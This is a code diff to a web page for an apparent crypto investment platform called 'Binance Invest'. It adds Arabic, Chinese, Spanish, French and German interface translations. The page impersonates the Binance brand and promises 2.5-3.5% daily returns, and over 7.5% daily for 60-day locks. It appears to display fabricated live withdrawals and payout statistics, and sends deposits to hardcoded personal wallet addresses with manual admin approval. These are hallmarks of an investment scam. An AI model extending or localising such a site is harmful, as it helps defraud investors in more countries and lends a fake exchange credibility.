@@ -155,7 +155,6 @@ header{height:72px;position:sticky;top:0;z-index:50;background:#05070be8;backdro
       <h2 data-t="deposit">Deposit</h2>
       <p class="muted" data-t="depositDesc">Add balance securely via wallet or gateway.</p>
       
-      <!-- فرم واریز وجه با پشتیبانی کامل از تغییر زبان -->
       <div style="margin-top: 15px;">
           <label style="display:block; color:#aeb7c3; font-size:12px; margin-bottom:5px;" data-t="depAmountLabel">Amount (USD):</label>
           <input type="number" id="deposit-amount" placeholder="100" style="width:100%; padding:8px; background:#2b313a; border:1px solid #474d57; color:#fff; border-radius:4px; margin-bottom:10px;">
@@ -344,15 +343,118 @@ optDirect:"1. Прямой платеж", optPaymentio:"2. Оплата чере
 walletMsg:"<b>Адрес кошелька для выбранной сети:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Переведите сумму на этот адрес и введите TXID для подтверждения администратором.</small>",
 paymentioMsg:"<b>Выбран шлюз Payment.io.</b> Введите номер счета или код транзакции ниже.",
 leemonMsg:"<b>Выбрана оплата картой / Lemon Squeezy.</b> Введите код подтверждения ниже."
+},
+ar:{
+brand:"بايننس إنفست",login:"تسجيل الدخول",register:"إنشاء حساب",logout:"تسجيل الخروج",overview:"نظرة عامة",markets:"الأسواق",invest:"استثمار",portfolio:"محفظتي",transactions:"المعاملات",rewards:"المكافآت",profile:"الملف الشخصي",
+hero:"ابنِ مستقبلك من خلال الاستثمار الذكي.",heroDesc:"استكشف الأصول الرقمية، وخطط الاستثمار، وأدوات المحفظة في واجهة واحدة متميزة.",exploreInvest:"استكشاف الاستثمارات",exploreMarkets:"استكشاف الأسواق",
+users:"مستخدمو المنصة",tracked:"الأصول المتتبعة",assets:"الأصول الرقمية",live:"الأسواق الحية",uptime:"وقت تشغيل المنصة",top:"أفضل الأسواق",viewAll:"عرض الكل",featured:"استثمارات مميزة",
+plans:"خطط الاستثمار",illustrative:"عوائد توضيحية",calculator:"حاسبة الاستثمار",amount:"المبلغ",plan:"الخطة",estimated:"القيمة المقدرة",
+balance:"الرصيد",invested:"المستثمر",profitTotal:"إجمالي الربح",level:"مستوى الحساب",deposit:"إيداع",depositDesc:"أضف رصيداً بأمان عبر المحفظة أو البوابة.",add:"إضافة رصيد",withdraw:"سحب",withdrawDesc:"اطلب السحب فوراً.",request:"طلب سحب",
+clear:"مسح السجل",copy:"نسخ الرمز",account:"الحساب",username:"اسم المستخدم",email:"البريد الإلكتروني",fullname:"الاسم الكامل",phone:"الهاتف",save:"حفظ الملف الشخصي",security:"الأمان",password:"كلمة المرور",continue:"متابعة",local:"يتم تخزين بيانات الحساب بأمان في قاعدة بيانات Supabase.",
+eyebrowText:"منصة الأصول الرقمية المميزة",footerTitle:"لماذا بايننس إنفست؟",footerDesc:"نحن نقدم موثوقية احترافية مع تنفيذ تداول منخفض الكمون للغاية، وأدوات محفظة ذكية، وبروتوكولات أمان متقدمة.",footerCopy:"© 2026 Binance Invest Global. جميع الحقوق محفوظة.",
+thAsset:"الأصل",thPrice:"السعر",th24h:"24س",thCap:"القيمة السوقية",thVol:"الحجم",
+customTitle:"خطة استثمار مخصصة",customDesc:"استثمر أي مبلغ مخصص من 1 دولار إلى 100,000 دولار.",customAmountLabel:"مبلغ مخصص (1$ - 100,000$)",customTermLabel:"المدة (أيام)",investCustomBtn:"استثمار بمبلغ مخصص",
+dailyProfitLabel:"الربح اليومي",monthlyProfitLabel:"الربح الشهري",
+lockNoticeText:"إذا قمت بقفل أموالك لمدة 60 يوماً أو أكثر، يصل معدل الربح اليومي الخاص بك إلى أكثر من 7.5% وفقاً لاتفاقية العقد.",
+pointsTitle:"النقاط",pointsSub:"+50 أسبوعياً",refTitle:"الإحالة",vipTitle:"VIP",vipSub:"1,250 نقطة",streakTitle:"التتابع",streakSub:"نشط",sec2fa:"التحقق الثنائي",secLogin:"حماية تسجيل الدخول",secWith:"تأكيد السحب",enabled:"مفعل",active:"نشط",
+forgotPasswordText:"هل نسيت كلمة المرور؟",needAccountText:"ليس لديك حساب؟ سجل الآن",haveAccountText:"لديك حساب بالفعل؟ سجل دخولك",usernameOrEmail:"اسم المستخدم أو البريد الإلكتروني",enterEmailOrUser:"أدخل اسم المستخدم أو البريد الإلكتروني المسجل",codeSentNotice:"تم إرسال رمز التحقق إلى بريدك الإلكتروني. (معاينة الرمز:",enterCode:"أدخل رمز التحقق المكون من 6 أرقام",sendResetCode:"إرسال رمز إعادة التعيين",resetPasswordTitle:"إعادة تعيين كلمة المرور",newPasswordLabel:"كلمة المرور الجديدة",resetBtn:"إعادة تعيين كلمة المرور",
+contactUs:"اتصل بنا", supportEmail:"البريد الإلكتروني للدعم", securityPartners:"شركاء الحماية والأمان",
+platformStatsTitle:"إحصائيات المنصة", statUsers:"مستخدمو المنصة", statInvestors:"المستثمرون النشطون", statPaid:"إجمالي الأرباح المدفوعة", statCapital:"رأس مال المنصة", liveWithdrawalsTitle:"عمليات السحب المباشرة", justNow:"الآن",
+depAmountLabel:"المبلغ (دولار أمريكي):", depMethodLabel:"اختر طريقة الدفع:", depCryptoLabel:"اختر العملة والشبكة:", depTxLabel:"رقم المعاملة / رمز المرجع (TXID):", depSubmitBtn:"إرسال طلب الإيداع",
+optDirect:"1. الدفع المباشر", optPaymentio:"2. الدفع عبر بوابة Payment.io", optLeemon:"3. الدفع بالبطاقة (Lemon Squeezy)",
+walletMsg:"<b>عنوان المحفظة للشبكة المحددة:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>يرجى تحويل المبلغ إلى هذا العنوان وإرسال كود TXID لموافقة المشرف.</small>",
+paymentioMsg:"<b>تم اختيار بوابة Payment.io.</b> يرجى المتابعة وإدخال رمز الفاتورة أو المعاملة أدناه.",
+leemonMsg:"<b>تم اختيار الدفع بالبطاقة / Lemon Squeezy.</b> يرجى إكمال الدفع وإدخال رمز المرجع للتحقق."
+},
+zh:{
+brand:"币安投资 (Binance Invest)",login:"登录",register:"注册账户",logout:"登出",overview:"概览",markets:"市场",invest:"投资",portfolio:"资产组合",transactions:"交易记录",rewards:"奖励",profile:"个人资料",
+hero:"通过智能投资构建您的未来。",heroDesc:"在一个高端界面中探索数字资产、投资计划和资产组合工具。",exploreInvest:"探索投资",exploreMarkets:"探索市场",
+users:"平台用户",tracked:"跟踪资产",assets:"数字资产",live:"实时市场",uptime:"正常运行时间",top:"热门市场",viewAll:"查看全部",featured:"精选投资",
+plans:"投资计划",illustrative:"演示收益",calculator:"投资计算器",amount:"金额",plan:"计划",estimated:"预计价值",
+balance:"余额",invested:"已投资",profitTotal:"总利润",level:"账户等级",deposit:"充值",depositDesc:"通过钱包或网关安全充值。",withdraw:"提现",withdrawDesc:"立即申请提现。",request:"申请提现",
+clear:"清除历史",copy:"复制代码",account:"账户",username:"用户名",email:"电子邮箱",fullname:"全名",phone:"电话",save:"保存资料",security:"安全",password:"密码",continue:"继续",local:"账户数据安全存储在 Supabase 数据库中。",
+eyebrowText:"高端数字资产平台",footerTitle:"为什么选择 Binance Invest？",footerDesc:"我们提供专业级可靠性、超低延迟交易执行和高级安全协议。",footerCopy:"© 2026 Binance Invest Global. 保留所有权利。",
+thAsset:"资产",thPrice:"价格",th24h:"24小时",thCap:"市值",thVol:"交易量",
+customTitle:"自定义投资计划",customDesc:"投资 1 美元到 100,000 美元之间的任意自定义金额。",customAmountLabel:"自定义金额 ($1 - $100,000)",customTermLabel:"期限（天）",investCustomBtn:"以自定义金额投资",
+dailyProfitLabel:"每日利润",monthlyProfitLabel:"每月利润",
+lockNoticeText:"如果您将资金锁仓 60 天或更长时间，根据合约协议，您的日利润率将达到 7.5% 以上。",
+pointsTitle:"积分",pointsSub:"每周 +50",refTitle:"推荐",vipTitle:"VIP",vipSub:"1,250 积分",streakTitle:"连续",streakSub:"活跃",sec2fa:"双重认证",secLogin:"登录保护",secWith:"提现确认",enabled:"已启用",active:"活跃",
+forgotPasswordText:"忘记密码？",needAccountText:"没有账户？立即注册",haveAccountText:"已有账户？去登录",usernameOrEmail:"用户名或邮箱",enterEmailOrUser:"输入您的用户名或注册邮箱",codeSentNotice:"验证码已发送至您的邮箱。(模拟验证码:",enterCode:"输入 6 位邮箱验证码",sendResetCode:"发送重置验证码",resetPasswordTitle:"重置密码",newPasswordLabel:"新密码",resetBtn:"重置密码",
+contactUs:"联系我们", supportEmail:"支持邮箱", securityPartners:"安全合作伙伴与保护",
+platformStatsTitle:"平台统计", statUsers:"平台用户", statInvestors:"活跃投资者", statPaid:"总支付利润", statCapital:"平台资本", liveWithdrawalsTitle:"实时提现", justNow:"刚刚",
+depAmountLabel:"金额 (美元):", depMethodLabel:"选择支付方式:", depCryptoLabel:"选择币种与网络:", depTxLabel:"交易哈希 / 参考代码 (TXID):", depSubmitBtn:"提交充值请求",
+optDirect:"1. 直接支付", optPaymentio:"2. 通过 Payment.io 网关支付", optLeemon:"3. 卡片支付 (Lemon Squeezy)",
+walletMsg:"<b>所选网络的钱包地址：</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>请将金额转入此地址并提交 TXID 以供管理员批准。</small>",
+paymentioMsg:"<b>已选择 Payment.io 网关。</b> 请继续并在下方输入您的账单或交易参考代码。",
+leemonMsg:"<b>已选择 Lemon Squeezy / 卡片支付。</b> 请完成支付并在下方输入参考代码进行验证。"
+},
+es:{
+brand:"Binance Invest",login:"Iniciar sesión",register:"Crear cuenta",logout:"Cerrar sesión",overview:"Resumen",markets:"Mercados",invest:"Invertir",portfolio:"Portafolio",transactions:"Transacciones",rewards:"Recompensas",profile:"Perfil",
+hero:"Construye tu futuro con una inversión inteligente.",heroDesc:"Explora activos digitales, planes de inversión y herramientas de portafolio en una interfaz premium.",exploreInvest:"Explorar inversiones",exploreMarkets:"Explorar mercados",
+users:"Usuarios de la plataforma",tracked:"Activos rastreados",assets:"Activos digitales",live:"Mercados en vivo",uptime:"Tiempo de actividad",top:"Principales mercados",viewAll:"Ver todo",featured:"Inversiones destacadas",
+plans:"Planes de inversión",illustrative:"Rendimientos ilustrativos",calculator:"Calculadora de inversión",amount:"Cantidad",plan:"Plan",estimated:"Valor estimado",
+balance:"Saldo",invested:"Invertido",profitTotal:"Beneficio total",level:"Nivel de cuenta",deposit:"Depósito",depositDesc:"Agrega saldo de forma segura mediante billetera o pasarela.",add:"Añadir saldo",withdraw:"Retirar",withdrawDesc:"Solicita un retiro al instante.",request:"Solicitar retiro",
+clear:"Borrar historial",copy:"Copiar código",account:"Cuenta",username:"Nombre de usuario",email:"Correo electrónico",fullname:"Nombre completo",phone:"Teléfono",save:"Guardar perfil",security:"Seguridad",password:"Contraseña",continue:"Continuar",local:"Los datos de la cuenta se almacenan de forma segura en la base de datos de Supabase.",
+eyebrowText:"PLATAFORMA DE ACTIVOS DIGITALES PREMIUM",footerTitle:"¿Por qué Binance Invest?",footerDesc:"Ofrecemos confiabilidad de nivel profesional con ejecución comercial de latencia ultrabaja.",footerCopy:"© 2026 Binance Invest Global. Todos los derechos reservados.",
+thAsset:"Activo",thPrice:"Precio",th24h:"24h",thCap:"Capitalización",thVol:"Volumen",
+customTitle:"Plan de inversión personalizado",customDesc:"Invierte cualquier cantidad personalizada de $1 a $100,000.",customAmountLabel:"Cantidad personalizada ($1 - $100,000)",customTermLabel:"Plazo (Días)",investCustomBtn:"Invertir cantidad personalizada",
+dailyProfitLabel:"Beneficio diario",monthlyProfitLabel:"Beneficio mensual",
+lockNoticeText:"Si bloqueas tu dinero durante 60 días o más, tu tasa de beneficio diario alcanza más del 7.5%.",
+pointsTitle:"Puntos",pointsSub:"+50 semanal",refTitle:"Referidos",vipTitle:"VIP",vipSub:"1,250 pts",streakTitle:"Racha",streakSub:"Activa",sec2fa:"2FA",secLogin:"Protección de inicio de sesión",secWith:"Confirmación de retiro",enabled:"Habilitado",active:"Activo",
+forgotPasswordText:"¿Olvidaste tu contraseña?",needAccountText:"¿No tienes cuenta? Regístrate",haveAccountText:"¿Ya tienes cuenta? Inicia sesión",usernameOrEmail:"Usuario o correo electrónico",enterEmailOrUser:"Ingresa tu usuario o correo electrónico",codeSentNotice:"Se ha enviado un código de verificación a tu correo. (Vista previa:",enterCode:"Ingresa el código de 6 dígitos",sendResetCode:"Enviar código",resetPasswordTitle:"Restablecer contraseña",newPasswordLabel:"Nueva contraseña",resetBtn:"Restablecer contraseña",
+contactUs:"Contáctanos", supportEmail:"Correo de soporte", securityPartners:"Socios de seguridad y protección",
+platformStatsTitle:"Estadísticas de la plataforma", statUsers:"Usuarios", statInvestors:"Inversores activos", statPaid:"Beneficio total pagado", statCapital:"Capital de la plataforma", liveWithdrawalsTitle:"Retiros en vivo", justNow:"Justo ahora",
+depAmountLabel:"Cantidad (USD):", depMethodLabel:"Seleccionar método de pago:", depCryptoLabel:"Seleccionar moneda y red:", depTxLabel:"Hash de transacción / Código (TXID):", depSubmitBtn:"Enviar solicitud de depósito",
+optDirect:"1. Pago directo", optPaymentio:"2. Pago mediante pasarela Payment.io", optLeemon:"3. Pago con tarjeta (Lemon Squeezy)",
+walletMsg:"<b>Dirección de billetera para la red seleccionada:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Transfiera el monto a esta dirección y envíe el TXID para aprobación del administrador.</small>",
+paymentioMsg:"<b>Pasarela Payment.io seleccionada.</b> Continúe e ingrese su código de factura o transacción a continuación.",
+leemonMsg:"<b>Pago con tarjeta / Lemon Squeezy seleccionado.</b> Complete el pago e ingrese el código de referencia."
+},
+fr:{
+brand:"Binance Invest",login:"Se connecter",register:"Créer un compte",logout:"Se déconnecter",overview:"Aperçu",markets:"Marchés",invest:"Investir",portfolio:"Portefeuille",transactions:"Transactions",rewards:"Récompenses",profile:"Profil",
+hero:"Construisez votre avenir grâce à l'investissement intelligent.",heroDesc:"Explorez les actifs numériques, les plans d'investissement et les outils de portefeuille.",exploreInvest:"Explorer les investissements",exploreMarkets:"Explorer les marchés",
+users:"Utilisateurs",tracked:"Actifs suivis",assets:"Actifs numériques",live:"Marchés en direct",uptime:"Disponibilité",top:"Principaux marchés",viewAll:"Voir tout",featured:"Investissements en vedette",
+plans:"Plans d'investissement",illustrative:"Rendements indicatifs",calculator:"Calculateur d'investissement",amount:"Montant",plan:"Plan",estimated:"Valeur estimée",
+balance:"Solde",invested:"Investi",profitTotal:"Profit total",level:"Niveau de compte",deposit:"Dépôt",depositDesc:"Ajoutez des fonds en toute sécurité.",withdraw:"Retirer",withdrawDesc:"Demandez un retrait instantané.",request:"Demander un retrait",
+clear:"Effacer l'historique",copy:"Copier le code",account:"Compte",username:"Nom d'utilisateur",email:"E-mail",fullname:"Nom complet",phone:"Téléphone",save:"Enregistrer",security:"Sécurité",password:"Mot de passe",continue:"Continuer",local:"Les données du compte sont stockées en toute sécurité dans Supabase.",
+eyebrowText:"PLATEFORME D'ACTIFS NUMÉRIQUES PREMIUM",footerTitle:"Pourquoi Binance Invest ?",footerDesc:"Nous offrons une fiabilité de niveau professionnel et une exécution à ultra-faible latence.",footerCopy:"© 2026 Binance Invest Global. Tous droits réservés.",
+thAsset:"Actif",thPrice:"Prix",th24h:"24h",thCap:"Capitalisation",thVol:"Volume",
+customTitle:"Plan d'investissement personnalisé",customDesc:"Investissez n'importe quel montant de 1 $ à 100 000 $.",customAmountLabel:"Montant personnalisé (1$ - 100 000$)",customTermLabel:"Durée (Jours)",investCustomBtn:"Investir",
+dailyProfitLabel:"Profit journalier",monthlyProfitLabel:"Profit mensuel",
+lockNoticeText:"Si vous bloquez vos fonds pendant 60 jours ou plus, votre taux de profit journalier dépasse 7.5%.",
+pointsTitle:"Points",pointsSub:"+50 par semaine",refTitle:"Parrainage",vipTitle:"VIP",vipSub:"1 250 pts",streakTitle:"Série",streakSub:"Actif",sec2fa:"2FA",secLogin:"Protection de connexion",secWith:"Confirmation de retrait",enabled:"Activé",active:"Actif",
+forgotPasswordText:"Mot de passe oublié ?",needAccountText:"Pas de compte ? Inscrivez-vous",haveAccountText:"Déjà un compte ? Connectez-vous",usernameOrEmail:"Nom d'utilisateur ou e-mail",enterEmailOrUser:"Entrez votre nom d'utilisateur ou e-mail",codeSentNotice:"Un code de vérification a été envoyé à votre e-mail (Aperçu :",enterCode:"Entrez le code à 6 chiffres",sendResetCode:"Envoyer le code",resetPasswordTitle:"Réinitialiser le mot de passe",newPasswordLabel:"Nouveau mot de passe",resetBtn:"Mettre à jour",
+contactUs:"Contactez-nous", supportEmail:"E-mail de support", securityPartners:"Partenaires de sécurité",
+platformStatsTitle:"Statistiques de la plateforme", statUsers:"Utilisateurs", statInvestors:"Investisseurs actifs", statPaid:"Profits versés", statCapital:"Capital de la plateforme", liveWithdrawalsTitle:"Retraits en direct", justNow:"À l'instant",
+depAmountLabel:"Montant (USD) :", depMethodLabel:"Sélectionner le mode de paiement :", depCryptoLabel:"Sélectionner la devise et le réseau :", depTxLabel:"Code de transaction / TXID :", depSubmitBtn:"Soumettre la demande de dépôt",
+optDirect:"1. Paiement direct", optPaymentio:"2. Paiement via Payment.io", optLeemon:"3. Paiement par carte (Lemon Squeezy)",
+walletMsg:"<b>Adresse du portefeuille pour le réseau sélectionné :</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Veuillez transférer le montant à cette adresse et soumettre le TXID.</small>",
+paymentioMsg:"<b>Passerelle Payment.io sélectionnée.</b> Veuillez procéder et entrer votre code de référence.",
+leemonMsg:"<b>Paiement par carte / Lemon Squeezy sélectionné.</b> Veuillez finaliser et entrer le code."
+},
+de:{
+brand:"Binance Invest",login:"Anmelden",register:"Konto erstellen",logout:"Abmelden",overview:"Übersicht",markets:"Märkte",invest:"Investieren",portfolio:"Portfolio",transactions:"Transaktionen",rewards:"Belohnungen",profile:"Profil",
+hero:"Bauen Sie Ihre Zukunft durch intelligenten Investieren auf.",heroDesc:"Entdecken Sie digitale Assets, Investitionspläne und Portfolio-Tools in einer Premium-Oberfläche.",exploreInvest:"Investitionen erkunden",exploreMarkets:"Märkte erkunden",
+users:"Benutzer",tracked:"Verfolgte Assets",assets:"Digitale Assets",live:"Live-Märkte",uptime:"Betriebszeit",top:"Top-Märkte",viewAll:"Alle anzeigen",featured:"Empfohlene Investitionen",
+plans:"Investitionspläne",illustrative:"Beispielhafte Renditen",calculator:"Investitionsrechner",amount:"Betrag",plan:"Plan",estimated:"Geschätzter Wert",
+balance:"Guthaben",invested:"Investiert",profitTotal:"Gesamtgewinn",level:"Konto-Stufe",deposit:"Einzahlen",depositDesc:"Guthaben sicher per Wallet oder Gateway aufladen.",withdraw:"Abheben",withdrawDesc:"Auszahlung sofort anfordern.",request:"Auszahlung anfordern",
+clear:"Verlauf löschen",copy:"Code kopieren",account:"Konto",username:"Benutzername",email:"E-Mail",fullname:"Vollständiger Name",phone:"Telefon",save:"Profil speichern",security:"Sicherheit",password:"Passwort",continue:"Weiter",local:"Kontodaten werden sicher in der Supabase-Datenbank gespeichert.",
+eyebrowText:"PREMIUM DIGITALE ASSET-PLATFORM",footerTitle:"Warum Binance Invest?",footerDesc:"Wir bieten professionelle Zuverlässigkeit mit ultraschneller Handelsausführung.",footerCopy:"© 2026 Binance Invest Global. Alle Rechte vorbehalten.",
+thAsset:"Asset",thPrice:"Preis",th24h:"24h",thCap:"Marktkapitalisierung",thVol:"Volumen",
+customTitle:"Benutzerdefinierter Investitionsplan",customDesc:"Investieren Sie einen beliebigen Betrag von 1 $ bis 100.000 $.",customAmountLabel:"Benutzerdefinierter Betrag ($1 - $100,000)",customTermLabel:"Laufzeit (Tage)",investCustomBtn:"Investieren",
+dailyProfitLabel:"Täglicher Gewinn",monthlyProfitLabel:"Monatlicher Gewinn",
+lockNoticeText:"Wenn Sie Ihr Geld für 60 Tage oder länger sperren, beträgt Ihr täglicher Gewinn laut Vertrag über 7.5%.",
+pointsTitle:"Punkte",pointsSub:"+50 wöchentlich",refTitle:"Empfehlung",vipTitle:"VIP",vipSub:"1.250 Pkt",streakTitle:"Serie",streakSub:"Aktiv",sec2fa:"2FA",secLogin:"Anmeldeschutz",secWith:"Auszahlungsbestätigung",enabled:"Aktiviert",active:"Aktiv",
+forgotPasswordText:"Passwort vergessen?",needAccountText:"Kein Konto? Registrieren",haveAccountText:"Bereits ein Konto? Anmelden",usernameOrEmail:"Benutzername oder E-Mail",enterEmailOrUser:"Geben Sie Ihren Benutzernamen oder Ihre E-Mail ein",codeSentNotice:"Ein Bestätigungscode wurde gesendet (Vorschau:",enterCode:"6-stelligen Code eingeben",sendResetCode:"Code senden",resetPasswordTitle:"Passwort zurücksetzen",newPasswordLabel:"Neues Passwort",resetBtn:"Passwort zurücksetzen",
+contactUs:"Kontakt", supportEmail:"Support-E-Mail", securityPartners:"Sicherheitspartner",
+platformStatsTitle:"Plattform-Statistiken", statUsers:"Benutzer", statInvestors:"Aktive Investoren", statPaid:"Gezahlter Gewinn", statCapital:"Plattformkapital", liveWithdrawalsTitle:"Live-Auszahlungen", justNow:"Gerade eben",
+depAmountLabel:"Betrag (USD):", depMethodLabel:"Zahlungsmethode auswählen:", depCryptoLabel:"Währung & Netzwerk auswählen:", depTxLabel:"Transaktions-Hash / TXID:", depSubmitBtn:"Einzahlungsantrag absenden",
+optDirect:"1. Direkte Zahlung", optPaymentio:"2. Zahlung über Payment.io Gateway", optLeemon:"3. Kartenzahlung (Lemon Squeezy)",
+walletMsg:"<b>Wallet-Adresse für das ausgewählte Netzwerk:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Bitte überweisen Sie den Betrag an diese Adresse und senden Sie die TXID zur Genehmigung durch den Administrator.</small>",
+paymentioMsg:"<b>Payment.io Gateway ausgewählt.</b> Bitte fortfahren und Rechnungs- oder Transaktionscode unten eingeben.",
+leemonMsg:"<b>Kartenzahlung / Lemon Squeezy ausgewählt.</b> Bitte Zahlung abschließen und Referenzcode eingeben."
 }
 };
-
-// پشتیبانی و شبیه‌سازی کامل برای سایر زبان‌های منو
-T.ar = T.fa;
-T.zh = T.en;
-T.es = T.en;
-T.fr = T.en;
-T.de = T.en;
 
 const coins=[["BTC","Bitcoin","bitcoin","₿"],["ETH","Ethereum","ethereum","Ξ"],["BNB","BNB","binancecoin","B"],["SOL","Solana","solana","S"],["XRP","XRP","ripple","X"],["ADA","Cardano","cardano","A"],["DOGE","Dogecoin","dogecoin","Ð"],["TRX","TRON","tron","T"],["AVAX","Avalanche","avalanche-2","A"],["LINK","Chainlink","chainlink","L"],["DOT","Polkadot","polkadot","D"],["LTC","Litecoin","litecoin","Ł"]];
 const demo={bitcoin:[116842,2.2,232e10,54e9],ethereum:[4421,3.1,533e9,26e9],binancecoin:[812,.8,118e9,2.4e9],solana:[182,-1.1,87e9,4.2e9],ripple:[3.12,1.8,178e9,6.2e9],cardano:[.88,-.7,32e9,.69e9],dogecoin:[.23,2.4,34e9,1.5e9],tron:[.36,.9,34e9,.72e9],"avalanche-2":[24.4,-.3,10.5e9,.32e9],chainlink:[24.8,1.7,16e9,.7e9],polkadot:[4.2,-.4,6.5e9,.18e9],litecoin:[122,1.1,9.2e9,.52e9]};
@@ -361,7 +463,6 @@ const plans=[["Starter",10,100,2.5,30],["Growth",110,1000,3.5,60],["Premium",110
 let live={}, stars=JSON.parse(localStorage.getItem("bi_stars")||"[]"), currentUser=null, authMode="login";
 let tempRegData=null, generatedEmailCode="";
 
-// آدرس‌های ولت اختصاصی شما
 const WALLETS = {
     trx_usdt_trc20: "TDeaeRTD4Ebj8FDhe4fZK3mGBNWnWajyzG",
     bnb_usdt_bep20: "0x7a858984dAE29B02d148f254eCa04aeB6c51f8fD",
@@ -651,7 +752,14 @@ function planCard(p,i){
   let planNames = {
     en: [["Starter", "Starter Plan"], ["Growth", "Growth Plan"], ["Premium", "Premium Plan"]],
     fa: [["Starter", "پلن استارتر"], ["Growth", "پلن رشد"], ["Premium", "پلن پریمیوم"]],
-    az: [["Starter", "Başlanğıc Planı"], ["Growth", "Böyümə Planı"], ["Premium", "Premium Planı"]]
+    az: [["Starter", "Başlanğıc Planı"], ["Growth", "Böyümə Planı"], ["Premium", "Premium Planı"]],
+    tr: [["Starter", "Başlangıç Planı"], ["Growth", "Büyüme Planı"], ["Premium", "Premium Planı"]],
+    ru: [["Starter", "Стартовый план"], ["Growth", "План роста"], ["Premium", "Премиум план"]],
+    ar: [["Starter", "خطة المبتدئين"], ["Growth", "خطة النمو"], ["Premium", "الخطة الممتازة"]],
+    zh: [["Starter", "新手计划"], ["Growth", "成长计划"], ["Premium", "高级计划"]],
+    es: [["Starter", "Plan Inicial"], ["Growth", "Plan de Crecimiento"], ["Premium", "Plan Premium"]],
+    fr: [["Starter", "Plan Débutant"], ["Growth", "Plan Croissance"], ["Premium", "Plan Premium"]],
+    de: [["Starter", "Starter-Plan"], ["Growth", "Wststums-Plan"], ["Premium", "Premium-Plan"]]
   };
   let lKey = planNames[lang] || planNames.en; let name = lKey[i][1]; let tagHtml = i===1 ? '<span class="tag">POPULAR</span>' : '';
   let minTxt = lang==="fa" ? `مبلغ: از $${p[1].toLocaleString()} تا $${p[2].toLocaleString()}` : `Amount: $${p[1].toLocaleString()} - $${p[2].toLocaleString()}`;
@@ -663,7 +771,18 @@ function planCard(p,i){
 function renderPlans(){
   plansEl("plans", plans); plansEl("homePlans", plans);
   let lang = localStorage.getItem("bi_lang")||"en";
-  let planNames = {en: ["Starter", "Growth", "Premium"], fa: ["استارتر", "رشد", "پریمیوم"], az: ["Başlanğıc", "Böyümə", "Premium"]};
+  let planNames = {
+    en: ["Starter", "Growth", "Premium"],
+    fa: ["استارتر", "رشد", "پریمیوم"],
+    az: ["Başlanğıc", "Böyümə", "Premium"],
+    tr: ["Başlangıç", "Büyüme", "Premium"],
+    ru: ["Стартовый", "Рост", "Премиум"],
+    ar: ["المبتدئين", "النمو", "الممتازة"],
+    zh: ["新手", "成长", "高级"],
+    es: ["Inicial", "Crecimiento", "Premium"],
+    fr: ["Débutant", "Croissance", "Premium"],
+    de: ["Starter", "Wachstum", "Premium"]
+  };
   let names = planNames[lang] || planNames.en;
   planSelect.innerHTML = plans.map((p,i)=>`<option value="${i}">${names[i]} — ${p[3]}% Daily</option>`).join("");
   calc(); calcCustom();
@@ -746,7 +865,6 @@ function setLang(l){
     if(d[k]) e.textContent = d[k];
   });
   
-  // به‌روزرسانی متن گزینه‌های پرداخت
   let optDirect = document.getElementById("opt-direct-payment");
   let optPaymentio = document.getElementById("opt-paymentio");
   let optLeemon = document.getElementById("opt-leemon");
